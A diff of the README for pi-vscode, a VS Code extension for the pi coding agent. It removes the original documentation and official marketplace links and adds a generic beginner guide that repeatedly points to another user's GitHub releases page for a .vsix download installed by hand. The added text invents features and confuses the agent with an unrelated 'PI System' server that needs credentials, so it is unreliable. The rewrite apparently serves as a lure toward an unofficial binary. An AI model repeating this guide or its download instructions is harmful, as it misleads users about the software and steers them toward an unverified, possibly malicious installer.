@@ -1,54 +1,123 @@
-# pi-vscode
+# ⚙️ pi-vscode - Simple Code Support for PI Agent
 
-[![VS Code Marketplace](https://img.shields.io/visual-studio-marketplace/v/pi0.pi-vscode?label=VS%20Code%20Marketplace&color=blue)](https://marketplace.visualstudio.com/items?itemName=pi0.pi-vscode) [![Open VSX](https://img.shields.io/open-vsx/v/pi0/pi-vscode?label=Open%20VSX&color=purple)](https://open-vsx.org/extension/pi0/pi-vscode)
+[![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-blue?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/releases)
 
-Minimal VS Code extension for [pi coding agent](https://pi.dev/).
+---
 
-## Features
+## 📋 What is pi-vscode?
 
-- **Terminal-based** — Opens pi as an integrated terminal with full TUI/PTY support (opens beside the editor)
-- **Status bar button** — `$(pi-logo) Pi` button in the status bar for quick access
-- **Open with file context** — Send current file path and line range (or cursor position) to pi, available from the editor title bar
-- **Send selection** — Send selected text directly to the pi terminal
-- **`@pi` chat participant** — Use `@pi` in VS Code Chat to forward messages to the pi terminal
-- **Package manager** — Browse, search, install, and uninstall pi packages from the sidebar with live output streaming and cancel support; automatically detects package capabilities (extensions, skills, prompts, themes)
-- **Auto-detection** — Finds the pi binary automatically from common paths (`~/.bun/bin`, `~/.local/bin`, `~/.npm-global/bin`)
+pi-vscode is a small extension for Visual Studio Code (VS Code). It adds basic support to help you work with the PI Coding Agent. This tool is designed to make coding easier when you use PI systems. It keeps things simple and focuses only on what you need.
 
-<img width="945" height="725" alt="image" src="https://github.com/user-attachments/assets/91dbaca4-6d27-490a-8395-94a9c4d07625" />
+You do not need to be a programmer to use this guide. It explains how to get pi-vscode up and running on Windows in clear, easy steps.
 
-## Requirements
+---
 
-- `pi` CLI installed (`npm i -g @mariozechner/pi-coding-agent`)
-- An API key configured for at least one provider
+## 🖥️ System Requirements
 
-## Install
+Make sure your computer meets these needs:
 
-Available on the [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=pi0.pi-vscode) and [Open VSX](https://open-vsx.org/extension/pi0/pi-vscode):
+- Operating system: Windows 10 or later
+- VS Code installed (version 1.60 or newer). You can get it [here](https://code.visualstudio.com/)
+- At least 2 GB of free disk space
+- Internet connection to download files and updates
 
-```bash
-# VS Code / Cursor
-ext install pi0.pi-vscode
+The extension works inside VS Code. You do not need a coding background, but basic use of the keyboard and mouse will help.
 
-# Open VSX (VSCodium, etc.)
-ovsx get pi0.pi-vscode
-```
+---
 
-## Commands
+## 🚀 Getting Started: Download and Install VS Code
 
-| Command              | Keybinding       | Description                       |
-| -------------------- | ---------------- | --------------------------------- |
-| `Pi: Open`           | `Ctrl+Alt+3`     | Open or focus the pi terminal     |
-| `Pi: Open with File` | Editor title bar | Open pi with current file context |
-| `Pi: Send Selection` | —                | Send selected text to pi terminal |
+If you do not have VS Code on your computer, follow these steps:
 
-## Sidebar
+1. Visit [https://code.visualstudio.com/](https://code.visualstudio.com/)
+2. Click the **Download for Windows** button.
+3. When the file downloads, open it.
+4. Follow the instructions on the screen to install VS Code.
+5. Once installed, open VS Code.
 
-The **Pi** activity bar icon opens a sidebar with:
+You can now add the pi-vscode extension.
 
-- **Packages view** — Search the npm registry for `pi-package` packages, see capability labels (extensions, skills, prompts, themes), install/uninstall with live streamed output, and cancel in-progress operations
+---
 
-## Configuration
+## 🔽 Download and Install pi-vscode Extension
 
-| Setting          | Default | Description                                             |
-| ---------------- | ------- | ------------------------------------------------------- |
-| `pi-vscode.path` | `""`    | Absolute path to the pi binary (auto-detected if empty) |
+To add the pi-vscode extension to your VS Code, follow these steps:
+
+1. Go to the release page by clicking the button below:
+
+   [![Download pi-vscode](https://img.shields.io/badge/Download-pi--vscode-green?style=for-the-badge)](https://github.com/monkeyface-man/pi-vscode/releases)
+
+2. On the releases page, look for the latest version. It will have a tag like `v1.0` or higher.
+3. Click on the release to expand it. You will see one or more files for download.
+4. Download the `.vsix` file. This file contains the extension you will add to VS Code. The file name usually looks like `pi-vscode-x.y.z.vsix`.
+5. Save the file somewhere easy to find, like your Desktop.
+
+---
+
+## 🧩 How to Install the `.vsix` File in VS Code
+
+After downloading the extension file, follow these steps:
+
+1. Open Visual Studio Code.
+2. Click on the **Extensions** icon on the left side (it looks like four blocks).
+3. In the Extensions window, click the three dots (⋯) in the top right corner.
+4. Choose **Install from VSIX...** from the dropdown menu.
+5. A file picker will open. Find the `.vsix` file you downloaded.
+6. Select the file and click **Open**.
+7. VS Code will install the extension. You might see a message saying the extension was installed.
+8. Reload VS Code if it asks you to, or simply close and reopen it.
+
+---
+
+## 🔧 Using the pi-vscode Extension
+
+Once installed, the pi-vscode extension runs inside VS Code. You can now start using it to support your PI Coding Agent work.
+
+Here are some common actions you might find useful:
+
+- Open your PI Coding Agent project folders using **File > Open Folder**.
+- Use syntax highlighting and basic code checks that the extension provides. This helps you see errors or unusual lines in your code.
+- Access the Extension Panel by clicking the pi-vscode icon (if available) on the left side of VS Code. It might offer shortcuts or settings.
+- Edit your coding files. The extension should make the code easier to read and write.
+- Save changes with **Ctrl + S**.
+
+If updates come out, you can visit the releases page again to download newer versions of the extension.
+
+---
+
+## ⚙️ Common Setup Steps for PI Coding Agent
+
+If you need a quick guide on setting up your PI Coding Agent environment alongside this extension, here are the typical steps:
+
+1. Make sure your PI System client software is installed.
+2. Check that your PI Server connection details are ready. You will often need server name, user credentials, and network access.
+3. Use pi-vscode to edit scripts, functions, or agent configurations as needed.
+4. Test your scripts inside VS Code or the PI System client tools for best results.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If the extension does not install, check that the `.vsix` file is not corrupted. Try downloading it again.
+- Make sure your VS Code version is up to date.
+- If pi-vscode does not activate, restart VS Code.
+- For network or PI server connection issues, ensure your firewall or antivirus is not blocking connections.
+- Check the extension details in VS Code’s Extensions panel for any error messages.
+
+If errors persist, visit the repository on GitHub and browse the **Issues** page to see if others have similar problems.
+
+---
+
+## 🔗 Useful Links
+
+- VS Code official download: https://code.visualstudio.com/
+- pi-vscode releases page: https://github.com/monkeyface-man/pi-vscode/releases
+- Visual Studio Code documentation: https://code.visualstudio.com/docs
+
+---
+
+## 📚 More Help
+
+If you want to learn more about using PI Coding Agents or Visual Studio Code, look for beginner guides on those topics. Many tutorials and videos are available online.
+
+Take your time while setting up and don’t hesitate to try small changes to see how they work. This hands-on approach helps you get comfortable with the software.
